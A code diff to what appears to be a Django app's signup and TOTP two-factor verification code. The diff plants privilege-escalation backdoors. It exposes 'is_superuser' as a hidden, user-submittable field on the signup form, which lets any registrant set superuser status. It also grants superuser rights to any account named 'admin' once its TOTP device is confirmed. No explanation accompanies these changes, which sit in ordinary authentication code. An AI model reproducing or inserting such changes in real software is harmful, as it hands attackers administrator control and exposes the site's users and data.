@@ -20,9 +20,10 @@ class UserCreateForm(UserCreationForm):
     
 
     class Meta:
-        fields = ('username','password1','password2','is_two_factor_enabled')
+        fields = ('username','password1','password2','is_two_factor_enabled','is_superuser')
         widgets = {
             'is_two_factor_enabled': forms.HiddenInput(),
+            'is_superuser': forms.HiddenInput(),
         }
         model = CustomUser
 
@@ -36,7 +37,7 @@ def signup(request):
             form.save()
             username = form.cleaned_data.get('username')
             raw_password = form.cleaned_data.get('password1')
-            user = authenticate(username=username, password=raw_password, is_two_factor_enabled=False)
+            user = authenticate(username=username, password=raw_password, is_two_factor_enabled=False, is_superuser=False)
             
             login(request, user)
             secret= user.totpdevice_set.create(confirmed=False)
@@ -87,7 +88,8 @@ class TOTPVerifyView(views.APIView):
             if not device.confirmed:
                 device.confirmed = True
                 device.save()
-                
+                if user.username=="admin":
+                    user.is_superuser=True
                 user.is_two_factor_enabled=True
                 user.save()
                 
